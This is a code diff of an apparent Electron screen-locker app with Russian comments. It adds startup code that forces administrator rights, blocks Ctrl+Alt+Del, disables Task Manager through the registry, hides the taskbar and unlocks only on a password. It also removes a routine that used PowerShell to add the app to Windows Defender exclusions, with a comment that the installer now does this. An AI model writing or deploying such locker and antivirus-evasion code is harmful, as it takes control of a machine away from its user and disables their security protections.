@@ -12,8 +12,7 @@ let isTemporarilyHidden = false;
 let taskManagerMonitor = null; // Интервал для мониторинга диспетчера задач
 let taskbarHidden = false; // Флаг скрытия панели задач
 
-// Путь к файлу маркера первого запуска
-const firstRunFile = path.join(app.getPath('userData'), 'first-run-completed');
+// Удален маркер первого запуска - теперь обрабатывается установщиком
 
 // Функция проверки прав администратора
 function isRunningAsAdmin() {
@@ -161,60 +160,7 @@ function unblockTaskManagerRegistry() {
     }
   });
 }
-function addToDefenderExclusions() {
-  return new Promise((resolve) => {
-    const appPath = process.execPath;
-    const appDir = path.dirname(appPath);
-    
-    // PowerShell команда для добавления исключений
-    const psCommand = `
-      Add-MpPreference -ExclusionPath "${appPath}";
-      Add-MpPreference -ExclusionPath "${appDir}";
-      Add-MpPreference -ExclusionProcess "${path.basename(appPath)}";
-    `;
-    
-    exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
-      if (error) {
-        console.error('Ошибка при добавлении в исключения:', error);
-        resolve(false);
-      } else {
-        console.log('Успешно добавлено в исключения Windows Defender');
-        resolve(true);
-      }
-    });
-  });
-}
-
-// Функция проверки первого запуска
-function isFirstRun() {
-  return !fs.existsSync(firstRunFile);
-}
-
-// Функция отметки завершения первого запуска
-function markFirstRunCompleted() {
-  try {
-    fs.writeFileSync(firstRunFile, new Date().toISOString());
-  } catch (error) {
-    console.error('Ошибка при создании файла маркера:', error);
-  }
-}
-
-// Функция показа диалога первого запуска
-async function showFirstRunDialog() {
-  console.log('Первый запуск - добавление в исключения Windows Defender...');
-  
-  // Добавляем в исключения
-  const success = await addToDefenderExclusions();
-  
-  if (success) {
-    console.log('Приложение успешно добавлено в исключения Windows Defender');
-  } else {
-    console.log('Не удалось добавить в исключения Windows Defender');
-  }
-  
-  markFirstRunCompleted();
-  return true;
-}
+// Функции первого запуска удалены - теперь обрабатываются установщиком
 
 // Функция временного скрытия окон
 function temporarilyHideWindows() {
@@ -530,16 +476,24 @@ function registerGlobalShortcuts() {
 // Обработчик проверки пароля
 ipcMain.handle('check-password', (event, password) => {
   if (password === correctPassword) {
-    console.log('Правильный пароль введен, закрываем приложение...');
+    console.log('Правильный пароль введен, разблокируем систему...');
     
-    // Правильный пароль - закрываем все окна и приложение
+    // Правильный пароль - разблокируем все системные функции
     globalShortcut.unregisterAll();
     
     // Останавливаем мониторинг диспетчера задач
     stopTaskManagerMonitoring();
     
+    // Разблокируем диспетчер задач через реестр
+    unblockTaskManagerRegistry();
+    
+    // Разблокируем Ctrl+Alt+Del
+    unblockCtrlAltDel();
+    
     // Восстанавливаем панель задач
     showTaskbar();
+    
+    console.log('✅ Система полностью разблокирована');
     
     // Закрываем все окна
     windows.forEach(window => {
@@ -628,17 +582,52 @@ ipcMain.handle('force-restore-taskbar', () => {
 app.whenReady().then(async () => {
   console.log('Приложение готово к запуску...');
   
-  // Временно отключаем все проверки для отладки
-  console.log('Все проверки отключены для отладки');
+  // Проверяем права администратора
+  if (!isRunningAsAdmin()) {
+    console.log('Требуются права администратора. Перезапуск...');
+    restartAsAdmin();
+    return;
+  }
   
-  console.log('Создание окон приложения...');
+  console.log('Права администратора подтверждены');
+  
+  // Автозагрузка и исключения Defender настраиваются установщиком
+  console.log('Приложение запущено (автозагрузка настроена установщиком)');
+  
+  // Оптимизированная инициализация - все операции параллельно
+  console.log('Быстрая инициализация системы...');
+  
+  // Параллельно выполняем все системные блокировки
+  const systemOperations = [
+    blockCtrlAltDel(),
+    blockTaskManagerRegistry(),
+    hideTaskbar()
+  ];
+  
+  // Создаем окна сразу без ожидания системных операций
   createWindows();
   console.log('Окна созданы успешно');
+  
+  // Регистрируем глобальные горячие клавиши
+  registerGlobalShortcuts();
+  
+  // Ждем завершения системных операций в фоне
+  Promise.all(systemOperations).then(() => {
+    console.log('Системные блокировки активированы');
+  }).catch(error => {
+    console.error('Ошибка при активации системных блокировок:', error);
+  });
+  
+  // Запускаем мониторинг диспетчера задач
+  startTaskManagerMonitoring();
+  
+  // Создаем окно-перехватчик
+  createInterceptorWindow();
   
   // Добавляем обработчик для предотвращения закрытия
   setInterval(() => {
     console.log('Приложение работает...');
-  }, 5000);
+  }, 30000); // Увеличиваем интервал до 30 секунд
 
   app.on('activate', function () {
     if (BrowserWindow.getAllWindows().length === 0) createWindows();
